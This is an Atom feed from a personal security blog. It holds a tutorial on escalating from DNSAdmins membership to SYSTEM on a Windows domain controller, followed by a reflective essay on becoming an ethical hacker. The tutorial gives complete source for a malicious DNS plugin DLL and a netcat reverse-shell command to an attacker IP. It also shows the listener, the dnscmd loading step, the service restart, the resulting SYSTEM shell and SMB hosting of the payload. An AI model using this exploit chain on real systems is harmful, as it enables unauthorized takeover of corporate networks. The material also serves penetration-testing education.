<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="https://sabebarker.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://sabebarker.com/" rel="alternate" type="text/html" /><updated>2020-01-12T01:00:03+08:00</updated><id>https://sabebarker.com/feed.xml</id><title type="html">Sabe Barker</title><subtitle>A cybersecurity and computer forensics enthusiast who likes to think of themself as a privacy advocate. Checkout my blog and writeups or browse the tools directory.</subtitle><author><name>Sabe Barker</name></author><entry><title type="html">DNSAdmin to Domain Controller Compromise</title><link href="https://sabebarker.com/blog/dnsadmin-to-domain-controller-compromise/" rel="alternate" type="text/html" title="DNSAdmin to Domain Controller Compromise" /><published>2020-01-09T00:00:00+08:00</published><updated>2020-01-09T00:00:00+08:00</updated><id>https://sabebarker.com/blog/dnsadmin-to-domain-controller-compromise</id><content type="html" xml:base="https://sabebarker.com/blog/dnsadmin-to-domain-controller-compromise/">This issue was first published by [Shay Ber](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) back in 2017. I recently had to use this &quot;feature&quot; for privilege escalation and during that process I found that the part where we need to execute the `DLL` can be troublesome to say the least. This seems to be due to the fact that the `DNS` service crashes and needs to be restarted. However, this can be more than temperamental.

I will point out that this post in no way is meant to add anything new to the process of the compromise but more of a notebook of how to create a working `DLL` and how to get the bloody thing to actually execute successfully. I found that when researching this issue many people I spoke to had attempted to create a custom working `DLL` but ended up resorting to creation with `msfvenom`. Me being me I wasn't happy to stop there as the `msfvenom` created `DLL` cannot be used locally on the machine as *Windows Defender* will nuke it. So if for whatever reason you cannot access the `DLL` remotely you wouldn't be able to obtain that beautiful *system* shell we desire so much. 

Now before we start I will just do the usual spiel: *This post is for educational purposes and I take no responsibility for any misuse of the information provided herein. Under no circumstances should you perform these actions on a system without prior consent from the owner.*

Enough with the banter let's get our hands dirty!

First off we will download the [Visual Studio 2019 Preview](https://visualstudio.microsoft.com/downloads/). I used the *Professional* version which you can get a &quot;free&quot; trial. Once downloaded go through the installation process and then open our program.

On the `Get started` window select `Create a new project`:

[![Visual Studio Get Started Screenshot][vs-getstarted]{: .img-fluid}][vs-getstarted]{: data-toggle=&quot;lightbox&quot;}

[vs-getstarted]: /assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-getstarted.png

We are presented with the `Create a new project` window where we will type `DLL` in to the search bar and select `Dynamic-Link Library with exports (DLL)` then click `Next`:

[![Visual Studio Create Project Screenshot][vs-newproject]{: .img-fluid}][vs-newproject]{: data-toggle=&quot;lightbox&quot;}

[vs-newproject]: /assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-newproject.png

Next we enter our `Project Name` and click `Create`:

[![Visual Studio Project Configure Screenshot][vs-configure]{: .img-fluid}][vs-configure]{: data-toggle=&quot;lightbox&quot;}

[vs-configure]: /assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-configure.png

We are presented with a template that includes two files one named `dllmain.cpp` and the other `DNSAdmin.cpp`:

[![Visual Studio Template Screenshot][vs-template]{: .img-fluid}][vs-template]{: data-toggle=&quot;lightbox&quot;}

[vs-template]: /assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-template.png

In `dllmain.cpp` we will edit to reflect the following code:

{% highlight cpp %}
/// dllmain.cpp : Defines the entry point for the DLL application.
#include &quot;pch.h&quot;
#include &lt;stdlib.h&gt;

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
{% endhighlight %}

In `DNSAdmin.cpp` we will also edit to reflect the following code:

{% highlight cpp %}
// DNSADMIN.cpp : Defines the exported functions for the DLL.

#include &quot;pch.h&quot;
#include &lt;stdlib.h&gt;
#include &quot;framework.h&quot;
#include &quot;DNSAdmin.h&quot;


#define DNS_PLUGIN_API  __declspec ( dllexport )

#pragma comment(linker,&quot;/EXPORT:DnsPluginInitialize=?DnsPluginInitialize@@YAHPEAX0@Z&quot;)
DNS_PLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) {
    system(&quot;C:\\Users\\&lt;username&gt;\\shell.cmd&quot;);
    return 0;
}

#pragma comment(linker,&quot;/EXPORT:DnsPluginCleanup=?DnsPluginCleanup@@YAHXZ&quot;)
DNS_PLUGIN_API int DnsPluginCleanup() { return 0; }

#pragma comment(linker,&quot;/EXPORT:DnsPluginQuery=?DnsPluginQuery@@YAHPEAX000@Z&quot;)
DNS_PLUGIN_API int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4) { return 0; }
{% endhighlight %}

Ensure you change `&lt;username&gt;` to the one that is on the `victim` machine then save your changes. You will notice a reference to a file called `shell.cmd`. This is where we will place our command to execute. In not hardcoding it to the `DLL` we can freely change it if need be.

An explanation of what is going on here can be found at Shay's [post](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) that was mentioned earlier.

Now it's time to build our `DLL`.

From the top menu we will change `debug` to `release` and `x32` to `x64` or whichever the arch is for the `victim` system:

[![Visual Studio Set Build Screenshot][vs-setbuild]{: .img-fluid}][vs-setbuild]{: data-toggle=&quot;lightbox&quot;}

[vs-setbuild]: /assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-setbuild.png

We will then navigate to `Build --&gt; Build Solution` in the top menu or type `Ctrl+Shift+B` to build our `DLL`:

[![Visual Studio Build Screenshot][vs-build]{: .img-fluid}][vs-build]{: data-toggle=&quot;lightbox&quot;}

[vs-build]: /assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-build.png

If we take a look in the `output` section at the bottom of our window we should see that our build succeeded:

[![Visual Studio Build Screenshot][vs-buildout]{: .img-fluid}][vs-buildout]{: data-toggle=&quot;lightbox&quot;}

[vs-buildout]: /assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-buildout.png

In this output we can also see that our build has been saved at the location `C:\Users\&lt;username&gt;\source\repos\DNSAdmin\x64\Release\DNSADMIN.dll`.

Now lets create our `cmd` file. Open up your favourite text editor and add the following line saving the file as `shell.cmd`:

{% highlight posh %}
C:\Users\&lt;username&gt;\nc.exe &lt;attacker-ip&gt; 1234 -e powershell.exe
{% endhighlight %}

Replacing `&lt;attacker-ip&gt;` with the `attacker` machines IP address.

You will also need to download `netcat` for windows which can be found [here](https://github.com/diegocr/netcat).

We should now have three files to work with: `DNSADMIN.dll`, `shell.cmd` and `nc.exe`.

Now upload/download these files to the `victim` machine in to the directory: `C:\Users\&lt;username&gt;`.

Let's setup our listener for the incoming connection on the `attacker` machine:

{% highlight shell %}
nc -lvp 1234
{% endhighlight %}

We will then load the `DLL` using the `dnscmd` command on the `victim` machine like so:

{% highlight posh %}
PS&gt; dnscmd /config /serverlevelplugindll \\&lt;servername&gt;\C$\Users\&lt;username&gt;\DNSADMIN.dll
{% endhighlight %}

On success we should see the output:

{% highlight shell %}
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
{% endhighlight %}

Now we have to restart the `DNS` service so our `DLL` is executed.

To do so we first stop the service:

{% highlight posh %}
PS&gt; sc.exe stop dns
SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
{% endhighlight %}

and then start it again:

{% highlight posh %}
PS&gt; sc.exe start dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2756
        FLAGS              : 
{% endhighlight %}

Back at your `netcat` session we should see a connection and our prompt:

{% highlight posh %}
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32&gt; whoami
nt authority\system
{% endhighlight %}

We now have control of the `Domain Controller`.

In the scenario where you need to host the `DLL` remotely you can fireup [impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py) on the `attacker` machine:

{% highlight bash %}
smbserver.py TMP /path/to/dll/
{% endhighlight %}

And then modify the `dnscmd` command:

{% highlight posh %}
dnscmd /config /serverlevelplugindll \\&lt;attacker-ip&gt;\TMP\DNSADMIN.dll
{% endhighlight %}

If you find that you do not receive a connection you can run the following command to test the `DLL`:

{% highlight posh %}
PS&gt; rundll32.exe .\DNSAdmin.dll,DnsPluginInitialize
{% endhighlight %}

If you get a connection to your `netcat` session then there is most likely some interference on the `victim` machine (AV, Firewall etc.)</content><author><name>Sabe Barker</name></author><summary type="html">In this post I will explain how a user within the DNSAdmins group can accomplish</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://sabebarker.com/assets/img/blog/dnsadmin-to-domain-controller-compromise/dnsadmin-to-domain-controller-compromise.png" /><media:content medium="image" url="https://sabebarker.com/assets/img/blog/dnsadmin-to-domain-controller-compromise/dnsadmin-to-domain-controller-compromise.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">The Path To Becoming An Ethical Hacker</title><link href="https://sabebarker.com/blog/the-path-to-becoming-an-ethical-hacker/" rel="alternate" type="text/html" title="The Path To Becoming An Ethical Hacker" /><published>2019-12-19T00:00:00+08:00</published><updated>2019-12-19T00:00:00+08:00</updated><id>https://sabebarker.com/blog/the-path-to-becoming-an-ethical-hacker</id><content type="html" xml:base="https://sabebarker.com/blog/the-path-to-becoming-an-ethical-hacker/">But now, times have changed from those days in the mid 90's. The simple problems are still the same. Misconfigurations, unpatched systems and weak passwords. But the landscape has evolved to something completely new. From malware techniques such as ransomware and cryptojacking to advanced persistent threat groups such as Fancy Bear and Stardust Chollima, attacks are more sophisticated and harder to detect.

Although I have been out of the game for over a decade I still have a strong interest in cybersecurity. So why didn't I stick with it back in the day? Simply put, I got sidetracked. Kids, mortgage, all that life stuff. Certain avenues I took led me away from the IT industry completely and even when I found myself back it wasn't in the computer security arena. But after a major event in my life I have taken a hard look at where I am and where I want to be. 

After a lot of thought the decision was made that cybersecurity is not only where I want to be it is where I need to be. It's hard to explain but when I am doing anything related to cybersecurity I feel like myself again. The other side to that coin however is that whenever I do anything related to computer security I feel like a fraud. I feel like no matter what I do no matter the amount of knowledge I gain I feel like it isn't enough. Like I should be doing more. I should know more. 

As I write over time you will probably notice that I never refer to myself as a hacker. I'm not too sure if it is the old school mindset I have but you are not a hacker unless you are recognised as one by known hackers within the community. Hackers that have proven themselves to the community. From my experience it seems that everyone these days are calling themselves hackers. 

Many that I have met seemed to have very limited knowledge but were still quite happy to call themselves a hacker even though they wouldn't be able to hack their way out of a wet paper bag. I refuse to be one of those people.

Ok so I have gotten off track. Story of my life. Where were we? *The Path To Becoming An Ethical Hacker*, right! So like I have mentioned I want to get back into hacking. I want to get some certificates under my belt. CISSP, CEH, OSCP the usual culprits. But I don't want this to be my main focus. Practical learning is key I feel. So I will get started at places like [Hack The Box](https://www.hackthebox.eu/) and [VulnHub](https://www.vulnhub.com/) as well as building my confidence to enter capture the flag competitions in my local area. 

On this site I will be keeping notes on various things I am learning and will be of a somewhat formal format. You will generally find these under the [Writeups](/writeups/) section. My [Blog](/blog/) where you are currently located will contain more personal thoughts and rants as you are experiencing at this very moment (apologies). No formal structure here I will just write what is on my mind. Finally, the [Tools](/tools/) section will be a directory of sorts listing tools that I have used with a little info about them and how I use them. 

Maybe someone will find the info helpful, who knows. But my main goal here is to force myself to write stuff down to not only help with retaining information but also as a reference for myself in the future. I had tried to do this a few times with tools such as KeepNote and the likes but I either got over it or it became a huge mess. I thought this might be more fun and it might force me to be more organised. We will see.

I have attended my local *Bsides* for the last few years and have really enjoyed them so I will continue with that. As well as getting back to attending my local *Sectalks* group. Deal with some of that social anxiety I have got going on. 

Anyways, I think I have written enough for my first post. If you have any feedback about the site hit me up. My social media links can be found at the top right of the site. I would love to know your thoughts.</content><author><name>Sabe Barker</name></author><summary type="html">Many years ago in my early teens I became interested in hacking. This was a time when</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://sabebarker.com/assets/img/blog/the-path-to-becoming-an-ethical-hacker.png" /><media:content medium="image" url="https://sabebarker.com/assets/img/blog/the-path-to-becoming-an-ethical-hacker.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>